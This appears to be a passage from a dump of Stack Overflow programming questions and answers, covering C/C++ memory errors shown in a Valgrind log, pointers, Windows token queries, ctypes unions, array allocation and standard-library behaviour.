==28892==  Address 0x53be034 is 4 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid write of size 1
==28892==    at 0x4C2839F: strcat (mc_replace_strmem.c:176)
==28892==    by 0x4041F7: get_headers (html.c:300)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be061 is 15 bytes before a block of size 40 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x403E53: get_headers (html.c:224)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid read of size 1
==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)
==28892==    by 0x40420D: get_headers (html.c:301)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892== Invalid read of size 1
==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)
==28892==    by 0x40420D: get_headers (html.c:301)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid write of size 1
==28892==    at 0x4C2838C: strcat (mc_replace_strmem.c:176)
==28892==    by 0x40420D: get_headers (html.c:301)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be061 is 15 bytes before a block of size 40 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x403E53: get_headers (html.c:224)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid read of size 1
==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)
==28892==    by 0x404223: get_headers (html.c:302)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid read of size 1
==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)
==28892==    by 0x404239: get_headers (html.c:303)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid write of size 1
==28892==    at 0x4C2838C: strcat (mc_replace_strmem.c:176)
==28892==    by 0x404239: get_headers (html.c:303)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be098 is 0 bytes after a block of size 40 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x403E53: get_headers (html.c:224)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid read of size 1
==28892==    at 0x4C286E4: __GI_strlen (mc_replace_strmem.c:284)
==28892==    by 0x402E0F: read_page (networking.c:348)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Syscall param socketcall.sendto(msg) points to unaddressable byte(s)
==28892==    at 0x5121052: send (send.c:28)
==28892==    by 0x40276D: send_msg (networking.c:245)
==28892==    by 0x402E29: read_page (networking.c:348)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892==
==28892== HEAP SUMMARY:
==28892==     in use at exit: 337 bytes in 10 blocks
==28892==   total heap usage: 19 allocs, 9 frees, 3,307 bytes allocated
==28892==
==28892== LEAK SUMMARY:
==28892==    definitely lost: 337 bytes in 10 blocks
==28892==    indirectly lost: 0 bytes in 0 blocks
==28892==      possibly lost: 0 bytes in 0 blocks
==28892==    still reachable: 0 bytes in 0 blocks
==28892==         suppressed: 0 bytes in 0 blocks
==28892== Rerun with --leak-check=full to see details of leaked memory
==28892==
==28892== For counts of detected and suppressed errors, rerun with: -v
==28892== Use --track-origins=yes to see where uninitialised values come from
==28892== ERROR SUMMARY: 348 errors from 17 contexts (suppressed: 4 from 4)
==28881==
==28881== HEAP SUMMARY:
==28881==     in use at exit: 0 bytes in 0 blocks
==28881==   total heap usage: 0 allocs, 0 frees, 0 bytes allocated
==28881==
==28881== All heap blocks were freed -- no leaks are possible
==28881==
==28881== For counts of detected and suppressed errors, rerun with: -v
==28881== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 4 from 4)
</code></pre>

<hr>

<pre><code>217 int get_headers(char* time, char* last_modified, char* server, char* content_type, size_t msglen, char* header, int flag)
218 {
219         char* header1 = NULL;
220         char* header2 = NULL;
221         char* header3 = NULL;
222         char* header4 = NULL;
223         char* header5 = NULL;
224
225         if ((header1 = (char*)malloc(strlen(""Date: "")+strlen(time)+2) ) ==NULL)
226         {
227                 fprintf(stderr, ""%s: No more memory\n"", getprogname());
228                 exit(EXIT_FAILURE);
229         }
230
231
232         strcpy(header1, ""Date: "");
233         strcat(header1, time);
234         strcat(header1, ""\n"");
235
236
237         if ((header2 = (char*)malloc(strlen(""Last-Modified: "")+strlen(last_modified)+5) ) ==NULL)
238         {
239                 fprintf(stderr, ""%s: No more memory\n"", getprogname());
240                 exit(EXIT_FAILURE);
241         }
242
243
244         strcpy(header2, ""Last-Modified: "");
245         strcat(header2, last_modified);
246         strcat(header2, ""\n"");
247
248
249         if ((header3 = (char*)malloc(strlen(""Server: "")+strlen(server)+5) ) ==NULL)
250         {
251                 fprintf(stderr, ""%s: No more memory\n"", getprogname());
252                 exit(EXIT_FAILURE);
253         }
254
255
256         strcpy(header3, ""Server: "");
257         strcat(header3, server);
258         strcat(header3, ""\n"");
259
260
261         if ((header4 = (char*)malloc(strlen(""Content-Type: "")+strlen(content_type)+5) ) ==NULL)
262         {
263                 fprintf(stderr, ""%s: No more memory\n"", getprogname());
264                 exit(EXIT_FAILURE);
265         }
266
267
268         strcpy(header4, ""Content-Type: "");
269         strcat(header4, content_type);
270         strcat(header4, ""\n"");
271
272
273         int content_length = strlen(header1)+strlen(header2)+strlen(header3)+strlen(header4)+strlen(""Content-Length: "")+msglen+5;
274         char temp[10] = {' '};
275         snprintf(temp, sizeof(msglen),""%d"", content_length);
276
277         if ((header5 = (char*)malloc(strlen(""Content-Length: "")+strlen(temp)+5) ) ==NULL)
278         {
279                 fprintf(stderr, ""%s: No more memory\n"", getprogname());
280                 exit(EXIT_FAILURE);
281         }
282
283
284         strcpy(header5, ""Content-Length: "");
285         strncat(header5, temp, strlen(temp));
286         strcat(header5, ""\n\n"");
287
288
289         if(flag == 1)
290         {
291                 strcpy(header, header1);
292                 strcat(header, header2);
293                 strcat(header, header3);
294                 strcat(header, header4);
295                 strcat(header, header5);
296         }
297
298         return content_length;
299         free(header1);
300         free(header2);
301         free(header3);
302         free(header4);
303         free(header5);
304 }
</code></pre>
","9530","","<p>If <code>flag</code> is 0, then you never initialize any of the data in the <code>header1..4</code> strings, so when you try to get their lengths with <code>strlen</code>, you read in uninitialized garbage.  You should make sure to always initialize the header values to empty strings regardless of the <code>flag</code> setting.</p>

<p>Also, there's no need to <code>strcat(..., ""\0"")</code> onto the string -- <code>strcpy</code> and <code>strcat</code> always null-terminate the strings (in fact, <code>""\0""</code> is indistinguishable from the empty string <code>""""</code>, since both of their first bytes are the NUL byte).  And beware of <a href=""http://en.wikipedia.org/wiki/Schlemiel_the_Painter%27s_algorithm"" rel=""nofollow"">Shlemiel the Painter algorithms</a> when concatenating a bunch of strings together.</p>
"
"<p>If I pass an int it will be passed by value.<br>
<code>void something(int i)</code><br>
If I pass some type of array it will be passed by reference.<br>
<code>void something(int i[])</code><br>
OR
<code>void something(int *i);</code></p>

<p>Types like int will be passed by value, arrays will be passed as reference.</p>

<p>The first question is, are there any more types that will be passed by reference?<br>
The second question is, what is the difference between the first pass of the array <code>(int i[])</code> and the second one <code>(int *i)</code> ?</p>

<p>EDIT:
I will clarify my question.
Which other types that you pass to a function, such as arrays, will be changeable inside the function. (which is not exactly pass-by-ref, as you explained).</p>

<pre><code>void something(int i[])
{
i[0]=5;
}

something(i);
</code></pre>

<p>This will change the array not only locally.</p>

<p>What about structs? unions? A pointer to them passes too?</p>
","9530","","<p>All types pass by value in C.  Arrays don't actually get passed in function calls -- when you declare an array parameter, the compiler silently replaces the array with a pointer, and when you call it, you pass the address of the array's first element.</p>

<p>Pointers get passed by value, too.  It's just that when you copy a pointer, you can still modify the pointed-to value, so it's quite similar to (but not exactly the same as) pass-by-reference.</p>
"
"<p>I come across <a href=""http://sourceware.org/newlib/libm.html#fma"" rel=""nofollow"">this page</a> and find there is an odd <em>floating multiply add</em>  function --<code>fma</code> and <code>fmaf</code>. It says that the result is something like:</p>

<pre><code> (x * y) + z             #fma(x,y,z)
</code></pre>

<p>And the value is <em>infinite precision and round once to the result format</em> .  </p>

<p>However, AFAICT I've never seen such a ternary operation before. So I'm wondering what's the cumstom usage for this func.</p>
","9530","","<p>It's usually used as an optimization.  Most floating-point units have an <code>fma</code> instruction, so the calculation can be performed in a single instruction instead of two or more.  So for performance-critical floating-point code, it's a helpful function to have.</p>
"
"<p>I have the following program written in C:</p>

<pre><code>#include ""stdafx.h""
#include &lt;Windows.h&gt;

void main()
{
    char buffer[1000];
    int size = sizeof(buffer);
    PDWORD required_size;

    printf(""----Application Privileges----\n\n"");
    printf(""In this program, we are going to obtain information about the application privileges\n\n"");

    HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId()); //Opening the current process
    HANDLE token; //Creating a handle for the token
    OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES, &amp;token); //Opening the process token

    GetTokenInformation(token, TokenPrivileges, buffer, size, required_size); //Obtaining the token information
    printf(""The following information was obtained with regards to the token privileges: \n\n"");
    printf(""%s\n\n"", buffer);

    printf(""Press enter to exit the program"");
    getchar();

}
</code></pre>

<p>Now, I am relatively new to the use of tokens.  When I try to execute the program, the following error comes up:</p>

<blockquote>
  <p>Run-Time Check Failure #3 - The variable 'required_size' is being used without being initialized.</p>
</blockquote>

<p>How can I solve this problem please?  What I want to do is to display information about the token privileges of the current process to the user.</p>

<p>I don't know exactly what the last variable (ReturnLength [out]) in the GetTokenInformation method does.  I tried reading the msdn documentation but did not understand its use.</p>
","9530","","<p>The <code>required_size</code> parameter is an ""out"" parameter, meaning that it returns information to you from the function (i.e. an extra return value).  You're supposed to pass it the address of an existing <code>DWORD</code> variable, and it fills in the data there, but you're passing it an uninitialized pointer which it tries to write through.</p>

<p>Your code should look like this:</p>

<pre><code>DWORD required_size;
GetTokenInformation(..., &amp;required_size);  // Pass address of required_size
// required_size now contains the required size of the data buffer
</code></pre>
"
"<p>I have the following code snippet written in C which is supposed to retrieve token information about the program privileges:</p>

<pre><code>char buffer[1000]; //Declaring the buffer where the token information will be stored
int size = sizeof(buffer); //Storing the size of the buffer
DWORD required_size; //A variable storing return information from the GetTokenInformation() method

HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId()); //Opening the current process
HANDLE token; //Creating a handle for the token
OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES, &amp;token); //Opening the process token

GetTokenInformation(token, TokenPrivileges, buffer, size, &amp;required_size); //Obtaining the token information
printf(""The following information was obtained with regards to the token privileges: \n\n"");
printf(""%s\n\n"", buffer);
</code></pre>

<p>The main problem is that when I try to print the contents of 'buffer', only rubbish information is printed on the screen :s  How can I solve this please?</p>
","9530","","<p>It's printing rubbish because the data you haven't isn't a C string, it's just raw binary data.  In the case of <code>TokenPrivileges</code>, the data is really a <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa379630%28v=vs.85%29.aspx"" rel=""nofollow""><code>TOKEN_PRIVILEGES</code></a> structure.</p>

<p>So, you should cast the byte buffer into a pointer to a <code>TOKEN_PRIVILEGES</code> structure.  Note that it ends with a <em>flexible array member</em> -- the <code>Privileges</code> array will contain a variable number of array elements, which is why you have to query the total size and use a large enough byte buffer instead of just allocating a <code>TOKEN_PRIVILEGES</code> on the stack, which wouldn't be large enough to hold more than one entry.</p>
"
"<p>I commonly have code where I want to detect some condition, and if it exists, then process that condition.</p>

<p>The test for the condition extracts certain information that is important to the processing half of the problem.</p>

<p>However, if/else constructs fail to allow one to declare local-to-the-if variables in the if construct itself(1).  Hence, I have to put variable declarations before the beginning of the entire if/else chain for all of the various conditions for which information may be extracted.</p>

<p>For example:</p>

<pre><code>    else if ((EndsWithToken(""d"") || EndsWithToken(""dsh"")) &amp;&amp;
             (p1 = find(m_input_line, '[')) &amp;&amp;
             (p2 = find(m_input_line, ']')) &amp;&amp;
              p2 &gt; p1)
    {
                // process what we found inside of the [ ] brackets using p1 and p2...
            }
</code></pre>

<p>This snippet is part of a long chain of if/else's, and the others don't need p1 and p2 - but they might need an integer value that was extracted from the input stream, or a double, or two points, or whatever....</p>

<p>The point is, there is no way that I know of introduce const TCHAR * p1 and p2 locally to the above scope, the only place it is used, that still allows for the overall structure to remain the same.</p>

<p>Is there some C++ language feature or a pattern that might allow for this?</p>

<hr>

<p>(1) As some have pointed out, it is possible to declare a single variable of fundamental type, if it is the fist thing, and to test it against non-zero only.  This is far too limited to be of much use as a general solution to this issue (though the occasional moment could come up where it is useful - but truly rare).</p>
","9530","","<p>You are allowed to define local variables in <code>if</code> and <code>while</code> statements; however, you can only declare a single one per statement, and you can only test the value for non-zero:</p>

<pre><code>...
else if (TCHAR *p1 = find(m_input_line, '['))
{
    if (TCHAR *p2 = find(m_input_line, ']'))
    {
        ...
    }
}
</code></pre>

<p>In this case, you could also just declare <code>TCHAR *p1, *p2;</code> before the chain of <code>if</code>/<code>else</code> statements, I wouldn't see any problems with that.</p>
"
"<p>I have just started to working with python and i'm wondering how should i define unions with python (using ctypes)? Hopefully i'm right that unions are supported via ctypes.  For example how the following c code is in python</p>

<pre><code>struct test
{
char something[10];
int status;
};

struct test2
{
char else[10];
int status;
int alive;
};

union tests
{
struct test a;
struct test2 b;
};

struct tester
{
char more_chars[20];
int magic;
union tests f;
};
</code></pre>

<p>Thx,Simple example added if someone else is looking the same answer</p>

<pre><code>from ctypes import *

class POINT(Structure):
    _fields_ = [(""x"", c_int),
                 (""y"", c_int)]

class POINT_1(Structure):
    _fields_ = [(""x"", c_int),
                 (""y"", c_int),
                 (""z"",c_int)]

class POINT_UNION(Union):
    _fields_ = [(""a"", POINT),
                 (""b"", POINT_1)]

class TEST(Structure):
    _fields_ = [(""magic"", c_int),
                 (""my_union"", POINT_UNION)]

testing = TEST()
testing.magic = 10;
testing.my_union.b.x=100
testing.my_union.b.y=200
testing.my_union.b.z=300
</code></pre>
","9530","","<p>Take a look at the <a href=""http://python.net/crew/theller/ctypes/tutorial.html#structures-and-unions"" rel=""nofollow""><code>ctypes</code> tutorial</a>.  You use the <code>ctypes.Union</code> class:</p>

<pre><code>class test(ctypes.Structure):
    # ...
class test2(ctypes.Structure):
    # ...

class tests(ctypes.Union):
    _fields_ = [(""a"", test),
                (""b"", test2)]
</code></pre>
"
"<p>I want to dynamically allocate 1 dimension of a 2D array (the other dimension is given). Does this work:</p>

<pre><code>int NCOLS = 20;

// nrows = user input...

double *arr[NCOLS];

arr = (double *)malloc(sizeof(double)*nrows);
</code></pre>

<p>and to free it:</p>

<pre><code>free(arr)
</code></pre>
","9530","","<p>Not quite -- what you've declared is an array of pointers.  You want a pointer to an array, which would be declared like this:</p>

<pre><code>double (*arr)[NCOLS];
</code></pre>

<p>Then, you'd allocate it like so:</p>

<pre><code>arr = malloc(nrows * sizeof(double[NCOLS]));
</code></pre>

<p>It can then be treated as a normal <code>nrows</code> by <code>NCOLS</code> 2D array.  To free it, just pass it to <code>free</code> like any other pointer.</p>

<p>In C, there's no need to cast the return value of <code>malloc</code>, since there's an implicit cast from <code>void*</code> to any pointer type (this is not true in C++).  In fact, doing so can mask errors, such as failing to <code>#include &lt;stdlib.h&gt;</code>, due to the existence of implicit declarations, so it's discouraged.</p>

<p>The data type <code>double[20]</code> is ""array 20 of <code>double</code>, and the type <code>double (*)[20]</code> is ""pointer to array 20 of <code>double</code>"".  The <code>cdecl(1)</code> program is very helpful in being able to decipher complex C declarations (<a href=""http://cdecl.ridiculousfish.com/?q=double+%28%2aarr%29%5B20%5D"" rel=""nofollow"">example</a>).</p>
"
"<p>I've created a 2-D Array, but fails and I get ""Unhandled exception at 0x77a415de in lab10.exe: 0xC0000374: A heap has been corrupted."" Not sure where to go from here or how to debug. I believe it has something to do with the size of my arrays or using malloc(). Thank you so much for the help in advance!</p>

<pre><code>//Get the number of Columns from the user
printf(""Enter the number of rows and columns:\n"");
scanf(""%d"", &amp;dimension);

//Allocate 1-D Array of Pointers, Array 'a'
a = (int** ) malloc( sizeof(int)*dimension);
if(a == NULL)
{
    printf(""\nError Allocating Memory"");
    exit(1);
}

//Allocate Rows for 2-D Array; Array 'a'
for(r = 0; r &lt; dimension; r++)
{
    a[r] = (int*) malloc( sizeof(int) * dimension);
    if (a[r] == NULL)
    {
        for(i = 0; i&lt; r; i++)
            free(a[i]);
        printf(""\nError Allocating Memory"");
        exit(1);
    }
}
</code></pre>

<p>There is more, but I do this 4 different times from the same integer 'dimension'. Thank you!</p>
","9530","","<p>This line is wrong:</p>

<pre><code>a = (int** ) malloc( sizeof(int)*dimension);
</code></pre>

<p>You're allocating enough space for an array of <code>dimension</code> elements of type <code>int</code>, but then you're using it as an array of <code>int*</code>.  If you're compiling a 64-bit program, then <code>sizeof(int*)</code> is 8 but <code>sizeof(int)</code> is 4, so you're not allocating enough space.  You need to use <code>sizeof(int*)</code>:</p>

<pre><code>a = (int** ) malloc( sizeof(int*)*dimension);
//                          ^^^^^
</code></pre>
"
"<p>I play with python 2.7. Here's my problem:</p>

<pre><code>&gt;&gt;&gt; bra=[]
&gt;&gt;&gt; put=['a','t']
&gt;&gt;&gt; bra.append(put)
&gt;&gt;&gt; bra
[['a', 't']]
&gt;&gt;&gt; bra.append(put)
&gt;&gt;&gt; bra
[['a', 't'], ['a', 't']]
&gt;&gt;&gt; bra.append(put.reverse())
&gt;&gt;&gt; bra
[['t', 'a'], ['t', 'a'], None]
</code></pre>

<p>My question is: why does de python interpreter give that result in the last line, instead this:</p>

<pre><code>[['a', 't'], ['a', 't'], ['t', 'a']]
</code></pre>

<p>or how can I get this result?</p>
","9530","","<p>Two issues:</p>

<ol>
<li>The <code>list.reverse</code> method modifies the list in-place and doesn't return anything (i.e. it returns <code>None</code>).  You probably wanted to use the <a href=""http://docs.python.org/2/library/functions.html#reversed""><code>reversed</code></a> method instead.</li>
<li>Both of the first two elements in your <code>bra</code> list refer to the same underlying object.  So, when you modified that object, both of the first two elements again referred to that same modified object, so that's why you see <code>['t', 'a']</code> for both of the first two elements.</li>
</ol>

<p>If you want to use separate objects instead of references to the same object, you can make copies by using the slicing operator:</p>

<pre><code>bra.append(put[:])  # Appends a copy of 'put'
</code></pre>

<p>As an alternative to the <code>reversed</code> method, you can also use the slicing operator with a step of -1 to reverse an iterable, although to some people, it's not as obvious what the code is doing:</p>

<pre><code>bra.append(put[::-1])  # Equivalent to bra.append(reversed(put))
</code></pre>
"
"<p>Here is an example code:</p>

<pre><code>enum Foo // or enum class whatever
{   BAR
,   STUFF
};

inline const char* to_string( const Foo&amp; foo )
{
    static const char* const NAMES[] = 
    {    ""BAR""
    ,    ""STUFF""
    };
    // let's assume I have some boundary checks here, it's not the point
    return NAMES[foo];
};
</code></pre>

<p>This function is inline, is in a header used in several compilation units.
The goal here is to make the compiler do nothing if there is no use of this function.</p>

<p>Questions:</p>

<ol>
<li>Does the C++ standard guarantee that NAMES will exists in only one object file, or is it left to the compiler to decide or does it guarantee that every object file will have it's copy?</li>
<li>If there will be multiple copies, will it be a linking problem (I'm assuming I can't test enough compilers to check that).</li>
<li>Will gcc, msvc and clang all optimize out this case by making the final binary have only one instance of NAMES?</li>
</ol>
","9530","","<p>Yes, the standard guarantees that there will be only one object.  From C++03 §7.1.2/4:</p>

<blockquote>
  <p>[...] A <code>static</code>
  local variable in an <code>extern inline</code> function always refers to the same object. A string literal in an
  extern inline function is the same object in different translation units.</p>
</blockquote>

<p>(Note that an <code>extern inline</code> function is an <code>inline</code> function with external linkage, i.e. an <code>inline</code> function not marked as <code>static</code>.)</p>

<p>Exactly which object file it appears in will depend on the compiler, but what I suspect happens is that each object file that uses it will get a copy, and the linker will arbitrarily choose one of the symbols and discard the rest.</p>
"
"<p>I cannot find any decent tutorials on how to load a PNG file and use it as a texture to bind it to a sphere. Are there any library functions to do this? 
How would i go about binding it to a sphere?
I've had a go with this and it hasnt worked, there are no errors but the texture is not loaded onto the sphere.
I call the LoadTexture with the particular file, before glutMainLoop()</p>

<p>Here is my code for the loading of a file:</p>

<pre><code>GLuint LoadTexture( const char * filename, int width, int height )
    {
GLuint texture;
unsigned char * data;
FILE * file;

//The following code will read in our PNG file
file = fopen( filename, ""rb"" );
if ( file == NULL ) return 0;
data = (unsigned char *)malloc( width * height * 3 );
fread( data, width * height * 3, 1, file );
fclose( file );

glGenTextures( 1, &amp;texture ); //generate the texture with 

glBindTexture( GL_TEXTURE_2D, texture ); //bind the texture

glTexEnvf( GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, 
GL_MODULATE ); //set texture environment parameters



//even better quality, but this will do for now.
glTexParameterf( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER,
 GL_LINEAR );
glTexParameterf( GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER,
 GL_LINEAR );

//Here we are setting the parameter to repeat the texture 
//to the edge of our shape. 
glTexParameterf( GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, 
 GL_REPEAT );
glTexParameterf( GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, 
 GL_REPEAT );

//Generate the texture
glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0,
 GL_RGB, GL_UNSIGNED_BYTE, data);
free( data ); //free the texture
return texture; //return whether it was successfull
</code></pre>

<p>}</p>

<p>and here is where i create the sphere</p>

<pre><code>void renderScene(void) {

// Clear Color and Depth Buffers
glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

 glEnable( GL_TEXTURE_2D );
// Reset transformations
glLoadIdentity();
glBindTexture( GL_TEXTURE_2D, texture );
glTexEnvf(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_MODULATE);

glPushMatrix();
glTranslatef(0.0,2.0,-6);
glRotatef(angle, 0.0f, 2.0, -6.0f);
glutSolidSphere(1,50,50);
glPopMatrix();


angle+=0.4f;
glDisable(GL_TEXTURE_2D);
glutSwapBuffers();
 }
</code></pre>

<p>Have i done any of it right? </p>
","9530","","<p>PNGs are compressed files, you can't just read them in and expect OpenGL to know how to decode them.  The recommended way to load a PNG is with <a href=""http://www.libpng.org/pub/png/libpng.html"" rel=""nofollow"">libpng</a>.</p>

<p>Here's an <a href=""http://zarb.org/~gc/html/libpng.html"" rel=""nofollow"">example</a> of using libpng which demonstrates synchronously reading in a PNG file into a 2D array.  OpenGL expects a flat 1D array, so you'll need to flatten it yourself, but that's pretty straightforward.</p>
"
"<p>I am keeping an index counter to what ought to behave like a circular array. I force the size to be a power of two, and thus use <code>size_t MASK = size_ - 1</code> in order to replace modulus when traversing like this:</p>

<pre><code>index_ = (++index_) &amp; MASK;
</code></pre>

<p>but the problem is, in my situation, I sometimes realize that I can reuse that index I handed out the next time around here, and so when that happens I have something like this:</p>

<pre><code>if (canReuseLastUsedIndex())
    --index_;
</code></pre>

<p>but then this crashes when the last dished out <code>index_</code> was zero because this does not wrap around to <code>size_</code> (i.e. <code>MASK+1</code>). Is there a bitop way to have this happen? Or something very fast? (i.e. preferably not having to say: <code>if (index_) --index_; else index_ = size_</code>)</p>
","9530","","<p>You can do the same thing and bitmask it:</p>

<pre><code>index_ = (index_ - 1) &amp; MASK;
</code></pre>

<p>This works because unsigned underflow is well-defined in C and C++.</p>

<p>Note that this line of code is <em>undefined behavior</em>:</p>

<pre><code>index_ = (++index_) &amp; MASK;
</code></pre>

<p>Because you're modifying the variable <code>index_</code> more than once between sequence points (in both the preincrement and the assignment).</p>
"
"<p>What standard says about situation when size of the container is greater than max_size?</p>

<p>UB, std::bad_alloc or something else?</p>

<p>MSVC throws an exception.</p>
","9530","","<p>The standard requires a <code>std::length_error</code> to be thrown in most cases, but in some cases the allocator may throw a different exception.</p>

<p>From C++03 §21.3/4a (Class template <code>basic_string</code>):</p>

<blockquote>
  <p>For any string operation, if as a result of the operation, <code>size()</code> would exceed <code>max_size()</code> then the
  operation throws <code>length_error</code>.</p>
</blockquote>

<p>§21.3.3/10-12 (<code>basic_string</code> capacity):</p>

<blockquote>
  <p><code>void reserve(size_type res_arg=0)</code>;<br>
  [...]<br>
  <strong>Throws:</strong> <code>length_error</code> if <code>res_arg &gt; max_size()</code>.<sup>218)</sup></p>
  
  <p>218) <code>reserve()</code> uses <code>Allocator::allocate()</code> which may throw an appropriate exception.</p>
</blockquote>

<p>§23.2.4.2/2-4 (<code>vector</code> capacity):</p>

<blockquote>
  <p><code>void reserve(size_type n)</code><br>
  [...]<br>
  <strong>Throws:</strong> <code>length_error</code> if <code>n &gt; max_size()</code>.<sup>248</sup></p>
  
  <p>248) <code>reserve()</code> uses <code>Allocator::allocate()</code> which may throw an appropriate exception.</p>
</blockquote>

<p>The standard doesn't explicitly mention this for the other standard containers (<code>deque</code>, <code>list</code>, <code>priority_queue</code>, <code>map</code>, <code>multimap</code>, <code>set</code>, <code>multiset</code>, and <code>bitset</code>).  However, in Table 65 (Container requirements), it says that <code>max_size</code> is the ""<code>size()</code> of the largest possible container"".</p>
"
"<p>For a project I am working on I use magic numbers.
This macro is used to define one</p>

<pre><code>#define BOOTSIGNATURE 0xAA55
</code></pre>

